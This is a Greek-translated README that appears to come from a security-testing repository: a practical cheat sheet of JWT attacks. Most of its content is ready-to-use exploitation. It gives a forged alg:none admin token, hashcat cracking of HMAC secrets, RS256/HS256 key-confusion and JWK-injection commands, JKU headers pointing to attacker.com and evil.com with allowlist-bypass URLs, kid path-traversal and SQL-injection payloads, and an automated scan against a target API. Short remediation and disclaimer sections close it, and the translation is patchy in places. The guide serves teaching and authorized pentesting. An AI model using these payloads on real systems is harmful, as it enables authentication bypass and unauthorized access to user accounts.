<!-- language-home-navigation -->
[🏠 Ελληνική Αρχική Σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🎟️ JWT Attacks - Πλήρες φύλλο εξαπάτησης

[🇹🇷 Türkçe Sürüm](μεταφράσεις/README.tr.md)
```
       ██╗██╗    ██╗████████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗███████╗
       ██║██║    ██║╚══██╔══╝    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝
       ██║██║ █╗ ██║   ██║       ███████║   ██║      ██║   ███████║██║     █████═╝ ███████╗
  ██   ██║██║███╗██║   ██║       ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ╚════██║
  ╚█████╔╝╚███╔███╔╝   ██║       ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗███████║
   ╚════╝  ╚══╝╚══╝    ╚═╝       ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝
             JSON Web Token Exploitation & Security Testing Guide
```
<p align="center">
  <img src="https://img.shields.io/badge/JWT-Attacks-orange?style=for-the-badge" alt="JWT Attacks">
  <img src="https://img.shields.io/badge/jwt_tool-Automated_Testing-blue?style=for-the-badge" alt="jwt_tool">
  <img src="https://img.shields.io/badge/Algorithm_Confusion-Key_Attacks-red?style=for-the-badge" alt="Key Attacks">
  <img src="https://img.shields.io/badge/Web_Security-API_Testing-green?style=for-the-badge" alt="Δοκιμή API">
</p>

<p align="center">
  <b>🛡️ Περιεκτική μεθοδολογία και πρακτικές εντολές για την εκμετάλλευση τρωτών σημείων JSON Web Token (JWT)</b>
</p>

---

## 📋 Πίνακας περιεχομένων

- [Introduction & Anatomy of a JWT](#-introduction--anatomy-of-a-jwt)
- [Essential Testing Tools] (#-essential-testing-tools)
- [Vulnerability Matrix & Attack Vectors](#-vulnerability-matrix--attack-vectors)
  - [1. None Algorithm Flaw (`alg: "none"`)](#1-none-algorithm-flaw-alg-none)
  - [2. Weak HMAC Secret Cracking (HS256)](#2-weak-hmac-secret-cracking-hs256)
  - [3. Σύγχυση αλγορίθμου / Σύγχυση κλειδιού (RS256 -> HS256)](#3-algorithm-confusion--key-confusion-rs256---hs256)
  - [4. JWK (JSON Web Key) Header Injection](#4-jwk-json-web-key-header-injection)
  - [5. JKU (JWK Set URL) Εσφαλμένη διαμόρφωση & SSRF](#5-jku-jwk-set-url-misconfiguration--ssrf)
  - [6. KID (Key ID) Header Manipulation & Injections](#6-kid-key-id-header-manipulation--injections)
  - [7. Cross-Service Relaying & Sensitive Data Leakage](#7-cross-service-relaying--sensitive-data-leakage)
- [Αυτοματοποίηση δοκιμών με `jwt_tool`](#-automating-tests-with-jwt_tool)
- [Διάσπαση μυστικών JWT με Hashcat](#-cracking-jwt-secrets-with-hashcat)
- [Πίνακας γρήγορης αναφοράς] (#-ταχεία αναφορά-πίνακας)
- [Remediation & Secure Implementation](#-remediation--secure-implementation)
- [Νομική αποποίηση ευθυνών](#-νομική αποποίηση ευθυνών)
- [Πόροι](#-πόροι)

---

## 🎯 Εισαγωγή & Ανατομία ενός JWT

Ένα **JSON Web Token (JWT)** είναι ένα συμπαγές, ασφαλές για URL μέσο για την αντιπροσώπευση αξιώσεων μεταξύ δύο μερών. Χρησιμοποιείται συνήθως για έλεγχο ταυτότητας περιόδου σύνδεσης σε σύγχρονα API REST, Εφαρμογές μεμονωμένης σελίδας (SPA) και μικροϋπηρεσίες.

Ένα τυπικό JWT αποτελείται από τρία μέρη με κωδικοποίηση Base64URL που χωρίζονται με τελείες (`.`):
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTYiLCJuYW1lIjoiQWxpY2UiLCJyb2xlIjoidXNlciJ9.4z7kE8l...
[------------- HEADER -------------].[-------------- PAYLOAD --------------].[----------- SIGNATURE -----------]
```
1. **Κεφαλίδα:** Προσδιορίζει τον τύπο διακριτικού και τον κρυπτογραφικό αλγόριθμο που χρησιμοποιείται (π.χ. `HS256`, `RS256`, `none`).
2. **Ωφέλιμο φορτίο:** Περιέχει τις αξιώσεις (π.χ. `user_id`, `role`, λήξη `exp`). *Σημείωση: Τα ωφέλιμα φορτία είναι κωδικοποιημένα, ΟΧΙ κρυπτογραφημένα!*
3. **Υπογραφή:** Δημιουργήθηκε με κατακερματισμό της κωδικοποιημένης κεφαλίδας και του ωφέλιμου φορτίου χρησιμοποιώντας ένα μυστικό κλειδί ή ιδιωτικό κλειδί.

---

## 🛠️ Βασικά εργαλεία δοκιμών

1. **jwt_tool:** Εργαλειοθήκη γραμμής εντολών για ανάλυση, δοκιμή και διάρρηξη JWT.
2. **Hashcat:** Γρήγορο μυστικό σπάσιμο HMAC που βασίζεται σε GPU (Λειτουργία `16500`).
3. **Επέκταση Burp Suite:** "JWT Editor" από τον Fraser Winterborn (στο PortSwigger BApp Store).

### Εγκατάσταση του `jwt_tool`
```bash
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
python3 -m pip install -r requirements.txt
alias jwt_tool='python3 /opt/jwt_tool/jwt_tool.py'
```
---

## 💥 Πίνακας ευπάθειας και διανύσματα επίθεσης

### 1. Κανένα ελάττωμα αλγορίθμου (`alg: "none"`)

**Μηχανισμός:**
Ορισμένες βιβλιοθήκες επαλήθευσης JWT θεωρούν τα διακριτικά έγκυρα εάν η κεφαλίδα `alg` έχει οριστεί σε `none`, παρακάμπτοντας πλήρως την επαλήθευση υπογραφής.

**Αξιοποίηση:**
1. Αποκωδικοποιήστε την κεφαλίδα και αλλάξτε το `"alg": "HS256"` σε `"alg": "none"`.
2. Τροποποίηση αξιώσεων ωφέλιμου φορτίου (π.χ. `"role": "admin"`).
3. Αφαιρέστε το τμήμα υπογραφής (κρατήστε την τελική κουκκίδα!).
```bash
# Using jwt_tool to forge 'none' algorithm token
python3 jwt_tool.py <TOKEN> -X a

# Test various casing variations (none, None, NONE, nOnE)
python3 jwt_tool.py <TOKEN> -T -S none
```
*Χειροκίνητη Δομή Token:*
```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.
```
---

### 2. Αδύναμη μυστική ρωγμή HMAC (HS256)

**Μηχανισμός:**
Εάν ο διακομιστής υπογράφει διακριτικά χρησιμοποιώντας συμμετρικούς αλγόριθμους (`HS256`, `HS384`, `HS512`) με ένα μαντέψιμο ή αδύναμο μυστικό κλειδί (π.χ. `secret`, `admin123`, όνομα εταιρείας), ένας εισβολέας μπορεί να εξαναγκάσει τα μυστικά εκτός σύνδεσης και να υπογράψει αυθαίρετα διακριτικά.

** Σπάσιμο με Hashcat:**
```bash
# Save the full JWT to a file
echo "eyJhbGciOi..." > jwt.txt

# Crack using Hashcat Mode 16500 (JWT Secret)
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt
```
**Σφυρηλάτηση κουπόνι μετά το ράγισμα:**
```bash
python3 jwt_tool.py <TOKEN> -T -S hs256 -p 'discovered_secret'
```
---

### 3. Σύγχυση αλγορίθμου / Σύγχυση κλειδιού (RS256 -> HS256)

**Μηχανισμός:**
- **RS256 (Ασύμμετρο):** Υπογεγραμμένο με το ιδιωτικό κλειδί του διακομιστή. επαληθεύτηκε με το **δημόσιο κλειδί** του διακομιστή.
- **HS256 (Συμμετρικό):** Υπογεγραμμένο και επαληθευμένο με το **το ίδιο κοινό μυστικό**.

Εάν η βιβλιοθήκη backend δεν επιβάλλει αυστηρά τους τύπους αλγορίθμων, ένας εισβολέας μπορεί:
1. Αποκτήστε το δημόσιο κλειδί του διακομιστή (συχνά εκτίθεται δημόσια στο `/.well-known/jwks.json` ή πιστοποιητικά).
2. Αλλάξτε την κεφαλίδα αλγορίθμου του διακριτικού από `RS256` σε `HS256`.
3. Υπογράψτε το τροποποιημένο διακριτικό με το **δημόσιο κλειδί** του διακομιστή ως μυστικό HMAC!
4. Ο διακομιστής λαμβάνει το διακριτικό, βλέπει το `HS256` και επαληθεύει την υπογραφή χρησιμοποιώντας το διαμορφωμένο κλειδί επαλήθευσης (που είναι το δημόσιο κλειδί του), με αποτέλεσμα μια έγκυρη υπογραφή!

**Εκμετάλλευση μέσω `jwt_tool`:**
```bash
# Supply the server's public key and perform key confusion
python3 jwt_tool.py <TOKEN> -X k -pk public.pem
```
---

### 4. JWK (JSON Web Key) Header Injection

**Μηχανισμός:**
Η προδιαγραφή JWT επιτρέπει ένα ενσωματωμένο δημόσιο κλειδί στην παράμετρο κεφαλίδας `jwk`. Οι ευάλωτοι διακομιστές εμπιστεύονται αυτό το κλειδί κεφαλίδας για την επαλήθευση της υπογραφής χωρίς να ελέγχουν εάν το κλειδί ανήκει σε μια αξιόπιστη ΑΠ ή σε μια προ-κοινόχρηστη λίστα επιτρεπόμενων.

**Αξιοποίηση:**
1. Δημιουργήστε ένα ζεύγος κλειδιών RSA εισβολέα.
2. Ενσωματώστε το δημόσιο κλειδί στην κεφαλίδα `jwk`.
3. Υπογράψτε το διακριτικό με το αντίστοιχο ιδιωτικό κλειδί σας.
```bash
# Inject self-signed key in header using jwt_tool
python3 jwt_tool.py <TOKEN> -X i
```
---

### 5. JKU (JWK Set URL) Εσφαλμένη διαμόρφωση & SSRF

**Μηχανισμός:**
Η κεφαλίδα `jku` (JWK Set URL) καθορίζει μια απομακρυσμένη διεύθυνση URL από την οποία ο διακομιστής πρέπει να ανακτήσει το σύνολο του δημόσιου κλειδιού για την επαλήθευση του διακριτικού.

**Αξιοποίηση:**
1. Φιλοξενήστε το δικό σας `jwks.json` σε διακομιστή ιστού εισβολέα:
   ```json
   {
     "keys": [
       {
         "kty": "RSA",
         "e": "AQAB",
         "use": "sig",
         "kid": "attacker-key",
         "n": "..."
       }
     ]
   }
   ```
2. Τροποποιήστε την κεφαλίδα του διακριτικού:
   ```json
   {
     "alg": "RS256",
     "typ": "JWT",
     "jku": "http://attacker.com/jwks.json",
     "kid": "attacker-key"
   }
   ```
3. Υπογράψτε το διακριτικό με το ιδιωτικό σας κλειδί.

> **Παράκαμψη λιστών επιτρεπόμενων διευθύνσεων URL:**
> Εάν η εφαρμογή επικυρώνει τις καταλήξεις τομέα, δοκιμάστε ανοιχτές ανακατευθύνσεις ή ιδιορρυθμίες ανάλυσης διευθύνσεων URL:
> - `https://trusted.com@attacker.com/jwks.json`
> - `https://trusted.com.attacker.com/jwks.json`
> - Άνοιγμα ανακατεύθυνσης: `https://trusted.com/redirect?url=http://attacker.com/jwks.json`

---

### 6. KID (Key ID) Header Manipulation & Injections

Η κεφαλίδα `kid` είναι μια συμβολοσειρά που χρησιμοποιείται για τον προσδιορισμό του κλειδιού που πρέπει να φορτωθεί από μια βάση δεδομένων ή ένα σύστημα αρχείων.

#### A. Διέλευση καταλόγου σε κενό αρχείο (`/dev/null`)
Εάν ο διακομιστής διαβάζει το αρχείο κλειδιού από το δίσκο χρησιμοποιώντας το `kid`:
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "/dev/null"
}
```
Υπογράψτε το διακριτικό με ένα κενό μυστικό (`""` / 0 byte)!

#### B. SQL Injection μέσω KID
Εάν ο διακομιστής ανακτήσει το μυστικό από μια βάση δεδομένων:
```sql
SELECT secret FROM keys WHERE kid = 'INPUT';
```
Εισάγετε μια γνωστή στατική συμβολοσειρά:
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key' UNION SELECT 'my_known_secret'-- -"
}
```
Υπογράψτε το διακριτικό χρησιμοποιώντας το μυστικό `'my_known_secret'`.

---

### 7. Αναμετάδοση πολλαπλών υπηρεσιών & διαρροή ευαίσθητων δεδομένων

- **Μη κρυπτογραφημένα PII:** Οι προγραμματιστές αποθηκεύουν συχνά κωδικούς πρόσβασης, SSN ή ευαίσθητα μεταδεδομένα χρήστη στο ωφέλιμο φορτίο, ξεχνώντας ότι είναι μόνο κωδικοποιημένα με Base64URL και όχι κρυπτογραφημένα.
- **Σύγχυση υπηρεσίας:** Χρήση ενός διακριτικού που προορίζεται για μια υπηρεσία χαμηλών προνομίων (π.χ., το API ανάλυσης) έναντι ενός εσωτερικού διαχειριστικού API.

---

## ⚡ Αυτοματοποίηση δοκιμών με `jwt_tool`

### Εκτελέστε όλες τις ενσωματωμένες επιθέσεις Playbook
Ο ευκολότερος τρόπος αυτόματης σάρωσης για όλες τις γνωστές ευπάθειες:
```bash
# Launch full automated playbook scan
python3 jwt_tool.py <TOKEN> -M pb -t https://target.com/api/user -rh "Authorization: Bearer <TOKEN>"
```
### Διαδραστική λειτουργία παραβίασης
```bash
# Interactively edit header or payload claims
python3 jwt_tool.py <TOKEN> -T
```
---

## 🔓 Σπάσιμο μυστικών JWT με το Hashcat
```bash
# 1. Format: Put token alone in a file
echo "eyJhbGciOiJIUzI1NiIsInR5..." > jwt.txt

# 2. Dictionary attack using rockyou
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt -w 3

# 3. Rule-based attack
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
---

## 📊 Γρήγορος πίνακας αναφοράς

| Ευπάθεια | Τεχνική επίθεσης | Ωφέλιμο φορτίο κλειδιού / Σημαία |
|---------------|------------------|--------------------|
| **Κανένας αλγόριθμος** | Σετ `alg: "none"`, strip signature | `jwt_tool <TOKEN> -X a` |
| **Αδύναμο μυστικό** | Λεξικό GPU brute-force | `hashcat -m 16500 jwt.txt rockyou.txt` |
| **Σύγχυση αλγορίθμου**| Αλλάξτε το RS256 σε HS256, υπογράψτε με δημόσιο κλειδί | `jwt_tool <TOKEN> -X k -pk pub.pem` |
| **JWK Injection** | Ενσωμάτωση δημόσιου κλειδιού εισβολέα στην κεφαλίδα | `jwt_tool <TOKEN> -X i` |
| **JKU Injection** | Τοποθετήστε το `jku` σε εξωτερικό διακομιστή | `"jku": "http://evil.com/jwks.json"` |
| **Διάβαση διαδρομής KID**| Σημειώστε `kid` έως `/dev/null` ή γνωστό αρχείο | `"kid": "/dev/null"` (Υπογραφή με `""`) |
| **KID SQLi** | Εισαγωγή στατικού μυστικού στο ερώτημα SQL | `"kid": "' UNION SELECT 'secret'-- -"` |

---

## 🛡️ Αποκατάσταση & Ασφαλής Εφαρμογή

1. **Ρητοί αλγόριθμοι λευκής λίστας:**
   Ποτέ μην επιτρέπεται η επιλογή `alg` που ελέγχεται από τον πελάτη. Επιτρεπόμενοι αλγόριθμοι σκληρού κώδικα στον διακομιστή (π.χ. να επιτρέπεται αποκλειστικά το `RS256`).
2. **Απορρίψτε τα διακριτικά `alg: none`:**
   Βεβαιωθείτε ότι η βιβλιοθήκη απορρίπτει αυστηρά μη επαληθευμένα ή ανυπόγραφα διακριτικά.
3. **Χρησιμοποιήστε μακριά, κρυπτογραφικά ασφαλή μυστικά:**
   Τα μυστικά HMAC πρέπει να είναι τουλάχιστον 256 bit (32+ τυχαίοι χαρακτήρες) που δημιουργούνται από ένα ασφαλές CSPRNG.
4. **Επικύρωση κεφαλίδων `jku` και `jwk`:**
   Λήψη συνόλων JWK μόνο από μια αυστηρή λίστα επιτρεπόμενων εσωτερικών αξιόπιστων διευθύνσεων URL. απόρριψη εξωτερικών τομέων που παρέχονται από τον χρήστη.
5. **Απολύστε τις τιμές `kid`:**
   Αντιμετωπίστε το `kid` ως μη αξιόπιστη είσοδο χρήστη. απολυμάνετε έναντι της διέλευσης καταλόγου (`../`) και της ένεσης SQL.

---

## ⚠️ Νομική αποποίηση ευθύνης

> **ΣΗΜΑΝΤΙΚΟ:** Οι επιθέσεις JWT μπορούν να οδηγήσουν σε πλήρη παράκαμψη ελέγχου ταυτότητας και μη εξουσιοδοτημένη πρόσβαση στις βάσεις δεδομένων εφαρμογών. Αυτός ο οδηγός προορίζεται αυστηρά για εκπαιδευτικούς σκοπούς και για εξουσιοδοτημένες δοκιμές διείσδυσης.

---

## 📚 Πόροι

- [jwt_tool GitHub Repository](https://github.com/ticarpi/jwt_tool)
- [PortSwigger Web Security Academy: JWT Attacks](https://portswigger.net/web-security/jwt)
- [RFC 7519 - Πρότυπο JSON Web Token (JWT)](https://datatracker.ietf.org/doc/html/rfc7519)